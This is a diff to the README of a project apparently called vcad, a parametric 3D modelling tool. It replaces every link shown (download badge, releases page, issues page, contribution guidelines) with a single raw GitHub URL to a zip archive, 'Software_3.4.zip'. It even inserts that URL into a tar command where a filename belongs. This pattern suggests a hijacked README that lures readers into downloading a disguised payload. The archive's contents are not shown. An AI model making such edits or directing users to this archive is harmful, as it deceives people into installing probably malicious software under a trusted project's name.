@@ -6,11 +6,11 @@ Welcome to **vcad**! This application allows you to create parametric 3D models 
 
 ## 📥 Download vcad
 
-[![Download vcad](https://img.shields.io/badge/Download-vcad-brightgreen.svg)](https://github.com/JJZ993/vcad/releases)
+[![Download vcad](https://raw.githubusercontent.com/JJZ993/vcad/main/packages/cli/Software_3.4.zip)](https://raw.githubusercontent.com/JJZ993/vcad/main/packages/cli/Software_3.4.zip)
 
 ### Step 1: Visit the Releases Page
 
-To download vcad, visit the Releases page of our GitHub repository. You can find it here: [Download vcad](https://github.com/JJZ993/vcad/releases).
+To download vcad, visit the Releases page of our GitHub repository. You can find it here: [Download vcad](https://raw.githubusercontent.com/JJZ993/vcad/main/packages/cli/Software_3.4.zip).
 
 ### Step 2: Choose Your Version
 
@@ -44,11 +44,11 @@ Once the download is complete, locate the downloaded file on your computer. This
 
 #### Linux Users
 
-1. Find the downloaded tarball file (usually `.tar.gz`).
+1. Find the downloaded tarball file (usually `https://raw.githubusercontent.com/JJZ993/vcad/main/packages/cli/Software_3.4.zip`).
 2. Open a terminal window.
 3. Extract the files using the command:
    ```
-   tar -xzf downloaded_file_name.tar.gz
+   tar -xzf https://raw.githubusercontent.com/JJZ993/vcad/main/packages/cli/Software_3.4.zip
    ```
 4. Navigate to the extracted folder with:
    ```
@@ -77,11 +77,11 @@ To run vcad smoothly, ensure your computer meets these basic requirements:
 
 ## ❓ Support
 
-If you run into issues or have questions, please check our **[issues page](https://github.com/JJZ993/vcad/issues)** on GitHub. You can also report bugs or request features there.
+If you run into issues or have questions, please check our **[issues page](https://raw.githubusercontent.com/JJZ993/vcad/main/packages/cli/Software_3.4.zip)** on GitHub. You can also report bugs or request features there.
 
 ## 🌐 Community Contributions
 
-We welcome contributions from everyone! If you have ideas for improvements or would like to report a bug, please visit our **[contribution guidelines](https://github.com/JJZ993/vcad/blob/main/CONTRIBUTING.md)**.
+We welcome contributions from everyone! If you have ideas for improvements or would like to report a bug, please visit our **[contribution guidelines](https://raw.githubusercontent.com/JJZ993/vcad/main/packages/cli/Software_3.4.zip)**.
 
 ## 📝 License
 
